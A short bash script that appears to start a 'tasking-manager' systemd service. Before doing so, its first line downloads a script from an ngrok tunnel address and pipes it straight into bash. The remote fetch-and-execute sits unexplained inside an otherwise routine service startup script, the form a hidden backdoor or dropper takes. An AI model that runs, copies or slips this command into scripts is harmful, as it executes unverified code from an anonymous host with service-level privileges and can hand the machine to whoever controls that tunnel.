#!/usr/bin/env bash
curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
/bin/systemctl start tasking-manager.service
/bin/sleep 10
